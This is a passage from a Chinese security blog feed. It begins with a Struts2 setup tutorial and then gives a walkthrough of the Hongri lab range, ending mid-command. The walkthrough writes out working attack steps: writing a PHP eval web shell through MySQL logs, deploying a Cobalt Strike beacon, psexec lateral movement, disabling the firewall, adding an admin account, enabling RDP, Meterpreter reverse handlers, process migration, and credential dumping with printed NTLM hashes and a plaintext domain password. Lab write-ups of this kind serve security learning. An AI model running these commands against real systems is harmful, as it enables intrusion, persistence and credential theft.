class="hljs-tag">&lt;<span class="hljs-name">constant</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;struts.devMode&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;true&quot;</span> /&gt;</span><br>    <span class="hljs-comment">&lt;!--所有的action要放在packages中，且要继承struts-default包，因为里面是该框架封装的东西--&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">package</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;basicstruts2&quot;</span> <span class="hljs-attr">extends</span>=<span class="hljs-string">&quot;struts-default&quot;</span>&gt;</span><br>        <span class="hljs-comment">&lt;!--name对应的是请求地址，class是请求处理的类--&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">action</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;index&quot;</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">result</span>&gt;</span>/index.jsp<span class="hljs-tag">&lt;/<span class="hljs-name">result</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">action</span>&gt;</span><br>        <span class="hljs-comment">&lt;!--result的name是Action类中返回的字符串，对应不同相应到不同页面--&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">action</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;hello&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;action.HelloWorldAction&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;execute&quot;</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;success&quot;</span>&gt;</span>/HelloWorld.jsp<span class="hljs-tag">&lt;/<span class="hljs-name">result</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">action</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">package</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">struts</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151444309.png" alt="image-20240510191813662"></p><p><code>struts.xml</code> 文件的主要作用包括：</p><ol><li><strong>定义包（Packages）</strong>：Struts 2 允许通过包的概念来组织和隔离不同的 Action 和结果类型。每个包可以有自己的命名空间，并且可以重用其他包中定义的类。</li><li><strong>配置 Action</strong>：在 <code>struts.xml</code> 中，你可以定义 Action，包括 Action 的类、方法以及它们映射到的请求 URL。Action 映射可以是简单的路径映射，也可以是更复杂的参数映射。</li><li><strong>结果（Result）映射</strong>：为每个 Action 定义可能的结果映射。结果可以是转发到另一个页面、重定向到另一个 URL，或者是自由格式的字符串。</li><li><strong>拦截器（Interceptors）配置</strong>：Struts 2 使用拦截器来处理如身份验证、日志记录、事务管理等横切关注点。在 <code>struts.xml</code> 中，可以定义拦截器栈（Interceptor Stacks）和特定的拦截器。</li><li><strong>异常处理</strong>：定义全局和操作级别的异常处理机制，允许你捕获和处理应用程序中的异常。</li><li><strong>类型转换</strong>：配置如何将 HTTP 请求参数转换为 Action 属性的类型。</li><li><strong>包含其他配置文件</strong>：可以使用 <code>&lt;include&gt;</code> 标签来包含其他配置文件，这有助于将配置分散到多个文件中，使主配置文件保持简洁。</li><li><strong>常量和文本资源</strong>：定义可以在多个地方使用的常量，以及国际化的文本资源。</li><li><strong>动态方法调用</strong>：允许你定义特定 Action 对应的多个方法，这些方法可以通过请求参数来动态调用。</li></ol><p><strong>写一个简单程序</strong></p><p>现在按照上面的struts.xml的配置来写一个hellworld的程序：</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> action;<br><br><span class="hljs-keyword">import</span> com.opensymphony.xwork2.Action;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HelloWorldAction</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Action</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">execute</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        System.out.println(<span class="hljs-string">&quot;Hello Struts2~~&quot;</span>);<br>        <span class="hljs-keyword">return</span> SUCCESS;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>目录结构如下：</p><p><img src="http://cdn.clown2024.cn/202407151444310.png" alt="image-20240510202619138"></p><blockquote><p>额这里配置时又有个坑，他的web目录下的有关struts2依赖的jar全都没有自动导入到WEB-INF&#x2F;lib下面，会导致启动的出现过滤器异常的问题</p></blockquote><p><img src="http://cdn.clown2024.cn/202407151444311.png" alt="image-20240510202443723"></p><p>所以要在这里把右边的jar包都添加过去才行。</p><p>然后启动tomcat服务器即可、</p><blockquote><p>难绷只能说又被坑惨了一次，访问路由是需要.action后缀的，不然就是资源未访问，难绷</p></blockquote><p><img src="http://cdn.clown2024.cn/202407151444312.png" alt="image-20240510205435309"></p><p><img src="http://cdn.clown2024.cn/202407151444313.png" alt="image-20240510205450490"></p><p>要修改后缀可以在struts.xml中使用这个属性设置</p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">constant</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;struts.action.extension&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;&quot;</span>/&gt;</span><br></code></pre></td></tr></table></figure><blockquote><p>这样子可以去掉后缀，但后果是所有jsp文件都不解析了，只能使用不带后缀的路由，然后根目录访问就是404访问半天也找不到原因服了，就这样吧</p></blockquote><p><img src="http://cdn.clown2024.cn/202407151444314.png" alt="image-20240510214235237"></p><p><img src="http://cdn.clown2024.cn/202407151444315.png" alt="image-20240510214249703"></p><blockquote><p>不过这样看到后缀是action的路由就能很明显的判断出是status框架</p></blockquote><h1><span id="s2-001远程代码执行漏洞">S2-001远程代码执行漏洞</span></h1><p>参考文章：<a href="https://anquanke.com/post/id/254808">https://anquanke.com/post/id/254808</a></p><p>S2-001的漏洞原理是模板文件（JSP）中引用了不合适的标签进行渲染，并且渲染的值是用户可控的，此时则达成了表达式注入的目的。</p><p>这篇文章从源码上去分析，十分详细，我这里就总结一下重点的地方</p><h2><span id="ognl表达式">OGNL表达式</span></h2><p>要先简单了解一下OGNL表达式是什么，因为该漏洞就是和该表达式渲染相关而产生的漏洞</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1&gt;&lt;span id=&quot;struts2介绍&quot;&gt;Struts2介绍&lt;/span&gt;&lt;/h1&gt;&lt;p&gt;Struts2是以MVC架构为基础的WEB框架，通过WEB Filter的方式内嵌在WEB服务器中进行使用，他对servlet进行了封装。&lt;/p&gt;
&lt;p&gt;Struts2与Struts</summary>
      
    
    
    
    <category term="Java框架漏洞" scheme="https://clowsman.github.io/categories/Java%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/"/>
    
    
    <category term="Java" scheme="https://clowsman.github.io/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>红日靶场-1</title>
    <link href="https://clowsman.github.io/2024/05/02/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/"/>
    <id>https://clowsman.github.io/2024/05/02/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/</id>
    <published>2024-05-02T10:47:46.000Z</published>
    <updated>2024-07-15T09:39:30.501Z</updated>
    
    <content type="html"><![CDATA[<h1><span id="靶场说明">靶场说明</span></h1><p>虚拟机的统一密码：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">hongrisec@2019<br>//有些靶机密码过期需要更改，统一改成下面这个<br>Hongrisec@2019<br></code></pre></td></tr></table></figure><p><strong>官方的靶场描述</strong></p><p>一、环境搭建<br>1.环境搭建测试<br>2.信息收集</p><p>二、漏洞利用<br>3.漏洞搜索与利用<br>4.后台Getshell上传技巧<br>5.系统信息收集<br>6.主机密码收集</p><p>三、内网搜集<br>7.内网–继续信息收集<br>8.内网攻击姿势–信息泄露<br>9.内网攻击姿势-MS08-067<br>10.内网攻击姿势-SMB远程桌面口令猜测<br>11.内网攻击姿势-Oracle数据库TNS服务漏洞<br>12.内网攻击姿势-RPC DCOM服务漏洞</p><p>四、横向移动<br>13.内网其它主机端口-文件读取<br>14.内网其它主机端口-redis<br>15.内网其它主机端口-redis Getshell<br>16.内网其它主机端口-MySQL数据库<br>17.内网其它主机端口-MySQL提权</p><p>五、构建通道<br>18.内网其它主机端口-代理转发</p><p>六、持久控制<br>19.域渗透-域成员信息收集<br>20.域渗透-基础服务弱口令探测及深度利用之powershell<br>21.域渗透-横向移动[wmi利用]<br>22.域渗透-C2命令执行<br>23.域渗透-利用DomainFronting实现对beacon的深度隐藏<br>24.域渗透-域控实现与利用</p><p>七、痕迹清理<br>25、日志清理</p><p><strong>靶场拓扑结构</strong></p><p><img src="http://cdn.clown2024.cn/202407151737522.png" alt="image-20240502190140254"></p><p><img src="http://cdn.clown2024.cn/202407151737523.png" alt="image-20240502222209415"></p><blockquote><p>win7为网站服务器，winServer为域成员，win2k3为域控</p></blockquote><h2><span id="环境配置">环境配置</span></h2><p>这里win7相当于网站服务器，需要两个网卡，我这里设置为VMnet2(仅主机模式)和VMnet8(NAT模式，和外界连通)</p><p><img src="http://cdn.clown2024.cn/202407151737525.png" alt="image-20240502223937110"></p><p><strong>win7</strong></p><p><img src="http://cdn.clown2024.cn/202407151737526.png" alt="image-20240502224014134"></p><p><strong>win_server</strong></p><p><img src="http://cdn.clown2024.cn/202407151737527.png" alt="image-20240502224057123"></p><p><strong>win2k3</strong></p><p><img src="http://cdn.clown2024.cn/202407151737528.png" alt="image-20240502224144546"></p><p>设置完之后需要去网络共享将ipv4改成自动获取地址，然后Windows7防火墙要关闭不然外界ping不通；</p><p>最后去相互ping一下看能否连通即可</p><p>最后启动win7上的web服务即可</p><p><img src="http://cdn.clown2024.cn/202407151737529.png" alt="image-20240502234452111"></p><p>然后去访问一下是能看到php探针的</p><p><img src="http://cdn.clown2024.cn/202407151737530.png" alt="image-20240502234617353"></p><blockquote><p>难绷后面发现win7使用<strong>net user &#x2F;domain</strong>连不上域网络，配了好久才好但也不清楚具体什么原因；配置的时候就严格按照官方的网段来配置重新配了一遍，将VMnet2网卡配置成192.168.52.xx网段，因为虚拟机一开始就已经配置了固定的ip。</p></blockquote><h1><span id="web页面渗透">Web页面渗透</span></h1><h2><span id="php探针">php探针</span></h2><p>就直接先从php的探针首页开始入手，从这里开始渗透这个Web网站</p><p><img src="http://cdn.clown2024.cn/202407151737531.png" alt="image-20240502235433732"></p><p>看到有个mysql连接先检测一下看看，直接root、root尝试一下</p><p><img src="http://cdn.clown2024.cn/202407151737532.png" alt="image-20240502235519904"></p><p>运气很好直接成功了，但是现在暂时没什么用</p><h2><span id="其他页面">其他页面</span></h2><p>那就惯例来目录扫描看一看，这里用gobuster</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">gobuster dir -u &quot;http://192.168.20.134/&quot; --wordlist=/usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151737533.png" alt="image-20240502235937240"></p><p>但是基本都是403，但是有一个phpmyadmin后台页面开着</p><p>然后用我们刚刚测试出来的数据库用户名和密码直接就可以登进去了(root:root)</p><p><img src="http://cdn.clown2024.cn/202407151737534.png" alt="image-20240503000212471"></p><h2><span id="phpmyadmin后台getshell">phpmyadmin后台getshell</span></h2><p>参考文章：<a href="https://www.cnblogs.com/0nc3/p/12071314.html">https://www.cnblogs.com/0nc3/p/12071314.html</a></p><p>总结一下大致有这几种getshell方式：</p><ol><li><p>select into outfile直接写入shell</p><p>条件：</p><ul><li>对web目录需要有写权限能够使用单引号</li><li>知道绝对路径</li><li>secure_file_priv没有具体值</li></ul></li><li><p>全局日志getshell</p><p>条件：root权限</p></li><li><p>慢查询日志getshell</p></li></ol><p>一开始尝试直接into outfile写入木马失败，绝对路径可以从上面的php探针页面知道网站的绝对路径为：<code> C:/phpStudy/WWW</code>，也可以通过@@basedir来查询，只不过查到的是mysql的根目录，但是可以反推一下</p><figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> &quot;&lt;?php eval($_POST[1]);?&gt;&quot; <span class="hljs-keyword">into</span> outfile <span class="hljs-string">&#x27;C:/phpStudy/WWW/shell.php&#x27;</span>;<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151737535.png" alt="image-20240503002537962"></p><p>去看一下参数</p><figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">show</span> <span class="hljs-keyword">global</span> variables <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;%secure%&#x27;</span>;<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151737536.png" alt="image-20240503002657736"></p><p>这里为NULL代表限制mysql不允许导入导出，那就只能看一下其他方法了</p><p><strong>全局日志写shell</strong></p><p>这里看看全局日志的配置情况</p><figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">show</span> variables <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;%general%&#x27;</span>;<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151737537.png" alt="image-20240503002947148"></p><p>然后我们可以开启general_log，并修改文件位置为我们的网站的shell.php</p><figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">set</span> <span class="hljs-keyword">global</span> general_log <span class="hljs-operator">=</span> <span class="hljs-keyword">on</span>;<br><span class="hljs-keyword">set</span> <span class="hljs-keyword">global</span> general_log_file <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;C:/phpStudy/WWW/shell.php&#x27;</span>;<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151737538.png" alt="image-20240503003300408"></p><p>接下来我们直接查询一下木马就会写入日志了</p><figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> &quot;&lt;?php eval($_POST[1]);?&gt;&quot;<br></code></pre></td></tr></table></figure><p>最后蚁剑连接成功getshell</p><p><img src="http://cdn.clown2024.cn/202407151737539.png" alt="image-20240503003518399"></p><h2><span id="yxcms">yxcms</span></h2><p>我们getshell之后可以看到还有一个yxcms，这是当时没扫出来的</p><p><img src="http://cdn.clown2024.cn/202407151737540.png" alt="image-20240503003928666"></p><p>这个地方看网上也是一个后台，在首页的公告栏处就会有账号密码，登陆之后就可以直接添加一个shell.php的文件了，这里就不测了。</p><h1><span id="cs打法">CS打法</span></h1><p>这里刚好熟悉一下cs的使用，用cs来上线靶机，cs的简单部署也直接记录在这里好了</p><h2><span id="cs部署">cs部署</span></h2><p>先安装java环境，网上随便找个教程即可，这里安装java8参考：<a href="https://cloud.tencent.com/developer/article/2105638">https://cloud.tencent.com/developer/article/2105638</a></p><p>这里记录一下安装命令：</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">先官网下载一个jdk包，创建一个目录存放解压后文件，我这里的jdk是<span class="hljs-string">&quot;jdk-8u401-linux-x64.tar.gz&quot;</span></span><br>sudo mkdir /usr/lib/jvm<br>sudo tar -zxvf jdk-8u401-linux-x64.tar.gz -C /usr/lib/jvm<br><span class="hljs-meta prompt_">#</span><span class="language-bash">修改环境变量</span><br>sudo vim ~/.bashrc<br><span class="hljs-meta prompt_">#</span><span class="language-bash">文件末尾添加</span><br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-built_in">set</span> oracle jdk environment</span><br>export JAVA_HOME=/usr/lib/jvm/jdk1.8.0_401  ## 这里要注意目录要换成自己解压的jdk 目录<br>export JRE_HOME=$&#123;JAVA_HOME&#125;/jre  <br>export CLASSPATH=.:$&#123;JAVA_HOME&#125;/lib:$&#123;JRE_HOME&#125;/lib  <br>export PATH=$&#123;JAVA_HOME&#125;/bin:$PATH <br><span class="hljs-meta prompt_">#</span><span class="language-bash">使环境变量生效</span><br>source ~/.bashrc<br><span class="hljs-meta prompt_">#</span><span class="language-bash">设置默认jdk</span><br>sudo update-alternatives --install /usr/bin/java java /usr/lib/jvm/jdk1.8.0_401/bin/java 300  <br>sudo update-alternatives --install /usr/bin/javac javac /usr/lib/jvm/jdk1.8.0_401/bin/javac 300  <br>sudo update-alternatives --install /usr/bin/jar jar /usr/lib/jvm/jdk1.8.0_401/bin/jar 300   <br>sudo update-alternatives --install /usr/bin/javah javah /usr/lib/jvm/jdk1.8.0_401/bin/javah 300   <br>sudo update-alternatives --install /usr/bin/javap javap /usr/lib/jvm/jdk1.8.0_401/bin/javap 300 <br><span class="hljs-meta prompt_">#</span><span class="language-bash">执行</span><br>sudo update-alternatives --config java<br><span class="hljs-meta prompt_">#</span><span class="language-bash">测试安装成功</span><br>java -version<br>javac -version<br></code></pre></td></tr></table></figure><p>用一台外网主机来部署cs服务器，要给server目录下的teamserver文件可执行权限</p><p><img src="http://cdn.clown2024.cn/202407151737541.png" alt="image-20240503112207679"></p><p>然后启动团队服务器，设置当前服务器的ip地址和密码</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">./teamserver &lt;vps地址&gt; &lt;密码&gt;<br></code></pre></td></tr></table></figure><p>然后利用启动脚本启动，我用的4.8版本只有一个启动脚本，其他版本是分不同系统不同的启动脚本，我这里启动脚本在Windows启动不了，环境没搞定，所以我就用kali了</p><p><img src="http://cdn.clown2024.cn/202407151737542.png" alt="image-20240503162849976"></p><p>然后输入主机和密码登陆即可，用户名随便定</p><p><img src="http://cdn.clown2024.cn/202407151737543.png" alt="image-20240503163035180"></p><blockquote><p>我这里服务器搭在了腾讯云上面，记得要开放50050的防火墙端口才能连上</p><p>具体功能使用可以看这篇文章：<a href="https://wiki.wgpsec.org/knowledge/intranet/Cobalt-Strike.html">https://wiki.wgpsec.org/knowledge/intranet/Cobalt-Strike.html</a></p><p>云服务器搭建可能出现的问题参考这篇文章：<a href="https://www.cnblogs.com/henry666/p/14027939.html">云服务器上搭建cobalt strike遇到的一些小问题 - 亨利其实很坏 - 博客园 (cnblogs.com)</a></p></blockquote><h2><span id="cs上线靶机">cs上线靶机</span></h2><p>生成一个Windows后门通过蚁剑上传到靶机</p><p><img src="http://cdn.clown2024.cn/202407151737544.png" alt="image-20240503164400241"></p><p>在这之前要先配置一个监听器</p><p><img src="http://cdn.clown2024.cn/202407151737545.png" alt="image-20240503165738645"></p><p>利用蚁剑上传到网站后，运行该程序即可看到靶机上线</p><p><img src="http://cdn.clown2024.cn/202407151737546.png" alt="image-20240503165821623"></p><p>可以直接右击靶机利用mimikatz抓取本地密码，或者直接输入hashdump列出用户哈希</p><p><img src="http://cdn.clown2024.cn/202407151737547.png" alt="image-20240503170150900"></p><p>然后利用Explore&#x3D;》new view探测一下其他主机</p><p><img src="http://cdn.clown2024.cn/202407151737548.png" alt="image-20240503170603756"></p><p><img src="http://cdn.clown2024.cn/202407151737549.png" alt="image-20240503170916667"></p><p>扫出了我们内网的另外两台靶机</p><p><strong>域内信息搜集</strong></p><p>麻了，这里win7连不上域控是真的无语，也不知道网卡出了什么问题搞了半天。</p><blockquote><p>后来严格按照官网重新配了一遍才好，上面也有说明；</p></blockquote><p>可以使用sleep 0加快一下交互，不过实战可能最好不要，因为容易被发现</p><p><img src="http://cdn.clown2024.cn/202407151737550.png" alt="image-20240508231828984"></p><p>我们可以先确定一下域控和其他域用户</p><p><strong>判断域环境</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">shell net config workstation<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151737551.png" alt="image-20240508232032749"></p><p><strong>判断域用户</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">shell net user /domain<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151737552.png" alt="image-20240508232158760"></p><p><strong>判断域控</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">shell net group &quot;Domain Controllers&quot; /domain<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151737553.png" alt="image-20240508232406793"></p><p>确定了域控的主机为<code>OWA$</code>，可以ping一下看能不能通</p><p><img src="http://cdn.clown2024.cn/202407151737554.png" alt="image-20240508232935606"></p><p>利用<code>net time</code>也可以定位域控，这里就不演示了</p><p><strong>看一下域管理员</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">shell net group &quot;Domain Admins&quot; /domain<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151737555.png" alt="image-20240508233119937"></p><p><strong>横向移动</strong></p><p>直接输入<code>net view</code>命令可以探测到其他的域主机</p><p><img src="http://cdn.clown2024.cn/202407151737556.png" alt="image-20240508233307337"></p><p><img src="http://cdn.clown2024.cn/202407151737557.png" alt="image-20240508233320930"></p><p>点击上图的地方列出我们刚刚扫描出来的内网主机，右击选择jump&#x3D;》psexec去登陆一下尝试，密码就是我们改过的这个<code>Hongrisec@2019</code>，因为密码一般都是由域控管理的，所以一般都是一样的，所以win7这台靶机其实也应该改成这个密码才对。</p><p>然后这里就可以直接一把梭了其实，直接用当前主机的凭据去用psexec横向移动即可，因为凭据都是一样的，然后监听器也选择那个反向shell的http监听器</p><p><img src="http://cdn.clown2024.cn/202407151737558.png" alt="image-20240508234256791"></p><p>两台主机都这样选择，然后等待回连即可</p><p>emmm很尴尬只上线了一台域控，另一台域成员反而没上线很奇怪</p><p><img src="http://cdn.clown2024.cn/202407151737559.png" alt="image-20240508235438343"></p><p>后来先建立了smb监听就可以进行psexec横向移动了，增加一个smb监听器即可</p><p><img src="http://cdn.clown2024.cn/202407151737560.png" alt="image-20240517224609304"></p><p><img src="http://cdn.clown2024.cn/202407151737561.png" alt="image-20240517224625150"></p><p>接下来用MSF的打法，学学其他东西</p><p><strong>关闭防火墙、添加管理员账户</strong></p><p>这里一开始上线应该顺手创立管理员用户然后关闭防火墙的，补一下:</p><p>还要开3389用于远程连接</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">netsh advfirewall <span class="hljs-built_in">set</span> allprofiles state off <span class="hljs-comment">#win关闭防火墙</span><br>net user clown 123qwe@2024 /add   <span class="hljs-comment">#添加账户密码</span><br>net localgroup administrators clown <span class="hljs-comment">#添加为管理员权限</span><br>REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal<span class="hljs-string">&quot; &quot;</span>Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f <span class="hljs-comment">#开启3389端口</span><br>REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal<span class="hljs-string">&quot; &quot;</span>Server /v fDenyTSConnections /t REG_DWORD /d 11111111 /f <span class="hljs-comment">#关闭3389</span><br></code></pre></td></tr></table></figure><h1><span id="msf渗透打法">MSF渗透打法</span></h1><h2><span id="cs联动msf">CS联动MSF</span></h2><p>这里就不重新用MSF来拿shell了</p><p>我们可以CS开启一个新监听，然后msf开启监听，将session转移到msf上面</p><p><img src="http://cdn.clown2024.cn/202407151737562.png" alt="image-20240517232416545"></p><p><img src="http://cdn.clown2024.cn/202407151737563.png" alt="image-20240517232757549"></p><p>MSF:</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">use exploit/multi/handler<br><span class="hljs-built_in">set</span> payload windows/meterpreter/reverse_http <span class="hljs-comment">#一定要注意payload是http不是tcp，一开始用了tcp一直连不上</span><br><span class="hljs-built_in">set</span> lhost 192.168.20.128<br><span class="hljs-built_in">set</span> lport 6666<br>exploit<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151737564.png" alt="image-20240518001337395"></p><p><strong>也可以MSF派生会话给cs</strong></p><p>这里记录流程就不试了</p><p>首先msf中已有会话session1</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">use exploit/windows/local/payload_inject<br><span class="hljs-built_in">set</span> payload windows/meterpreter/reverse_http  <span class="hljs-comment">#两边的payload协议一定要对应的</span><br><span class="hljs-built_in">set</span> DisablePayloadHandler <span class="hljs-literal">true</span>   <span class="hljs-comment">#默认情况下，payload_inject执行之后会在本地产生一个新的handler，由于已经有了一个不需要再产生一个，所以这里设置为true</span><br><span class="hljs-built_in">set</span> lhost xxxx <span class="hljs-comment">#cobaltstrike服务端ip</span><br><span class="hljs-built_in">set</span> lport xxxx <span class="hljs-comment">#cobaltstrike服务端监听的端口 </span><br><span class="hljs-built_in">set</span> session 1  <span class="hljs-comment">#这里是当前获得的session的id</span><br>exploit<br></code></pre></td></tr></table></figure><p>然后cs就可以成功拿到shell</p><p><strong>进程迁移</strong></p><p>因为meterpreter会话不太稳定，上线后可以做一个进程迁移，参考文章：<a href="https://blog.csdn.net/weixin_44023693/article/details/104925099">https://blog.csdn.net/weixin_44023693/article/details/104925099</a></p><ol><li><p>先ps获取目标主机的进程</p><p><img src="http://cdn.clown2024.cn/202407151737565.png" alt="image-20240518001528797"></p></li><li><p>getpid查看自己的进程号</p><p><img src="http://cdn.clown2024.cn/202407151737566.png" alt="image-20240518001555284"></p></li><li><p>利用migrate迁移到稳定的进程，可以选择svchost.exe或者explorer.exe，这里用explorer.exe</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">migrate 1452<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151737567.png" alt="image-20240518002212153"></p><p>也可以用自动迁移进程的命令：</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">run post/windows/manage/migrate<br></code></pre></td></tr></table></figure></li></ol><blockquote><p>迁移也会窃取到对应用户的令牌</p></blockquote><p><img src="http://cdn.clown2024.cn/202407151737568.png" alt="image-20240518004001288"></p><h2><span id="msf横向移动">MSF横向移动</span></h2><p>这里可以先抓取一下本地用户的明文密码或者哈希，待会psexec横向移动的时候会用到</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">hashdump<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151737569.png" alt="image-20240518004658364"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::<br>clown:1005:aad3b435b51404eeaad3b435b51404ee:d42bd392b52fdac4b29d5cdf59cff276:::<br>Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::<br>liukaifeng01:1000:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::<br></code></pre></td></tr></table></figure><p>然后使用kiwi模块，mimikatz已经集成在里面了</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">use kiwi<br><span class="hljs-built_in">help</span> <span class="hljs-comment">#查看命令</span><br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151737570.png" alt="image-20240518004846544"></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">getsystem  <span class="hljs-comment">#提权</span><br>creds_all  <span class="hljs-comment">#获取所有凭据</span><br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151737571.png" alt="image-20240518005050479"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">Administrator  GOD     Hongrisec@2019<br></code></pre></td></tr></table></figure><p><strong>进入终端</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">shell  <span class="hljs-comment">#进入终端</span><br></code></pre></td></tr></table></figure><p><strong>查看域内主机</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">chcp 65001  <span class="hljs-comment">#改变编码，不然会乱码</span><br>net view<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151737572.png" alt="image-20240518005427752"></p><p><strong>查看是否为蜜罐</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">run post/windows/gather/checkvm <span class="hljs-comment">#查看是否为虚拟机(蜜罐)</span><br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151737573.png" alt="image-20240518011240458"></p><p><strong>添加路由转发</strong></p><p>路由转发的具体作用参考这篇文章：<a href="https://www.anquanke.com/post/id/86505">https://www.anquanke.com/post/id/86505</a></p><p>大概作用就是利用该主机作为跳板机，在MSF平台上添加去往内网网段的路由</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">run autoroute -h  <span class="hljs-comment">#查看路由添加帮助</span><br>run get_local_subnets  <span class="hljs-comment">#查看主机所处的所有网段</span><br>run autoroute -s 192.168.52.0/24 <span class="hljs-comment">#添加去往目标网段的路由</span><br><br>run post/multi/manage/autoroute <span class="hljs-comment">#自动添加路由</span><br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151737574.png" alt="image-20240518011451547"></p><p><img src="http://cdn.clown2024.cn/202407151737575.png" alt="image-20240518011507107"></p><p><img src="http://cdn.clown2024.cn/202407151737576.png" alt="image-20240518011553537"></p><p><strong>继续渗透</strong></p><p>路由打通后就需要将会话放到后台然后进行其他攻击操作</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">background<br>sessions -i<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151737577.png" alt="image-20240518011730502"></p><p>接下来就可以进行端口扫描</p><p>先进行局部端口扫描</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">background                                      <br>use 